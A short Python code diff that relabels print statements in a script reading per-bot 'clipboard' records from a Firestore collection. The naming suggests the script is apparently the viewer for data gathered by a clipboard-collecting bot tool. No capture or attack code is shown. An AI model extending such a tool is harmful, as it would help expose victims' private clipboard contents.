@@ -27,13 +27,14 @@ if(seleccionBot == ""):
         doc_ref = firestore_db.collection(u'portapapeles').document(i)
         doc = doc_ref.get()
         if doc.exists:
-            print(f'Document data for bot {i}: {doc.to_dict()}')
+            print(f'Clipboard data for bot {i}: {doc.to_dict()}')
         else:
             print(u'The selected Bot ID is wrong or it does not exist on the Database')
 else:
     doc_ref = firestore_db.collection(u'portapapeles').document(seleccionBot)
     doc = doc_ref.get()
     if doc.exists:
-        print(f'Document data: {doc.to_dict()}')
+        print(f'Clipboard data: {doc.to_dict()}')
     else:
         print(u'The selected Bot ID is wrong or it does not exist on the Database')
+print("\n")
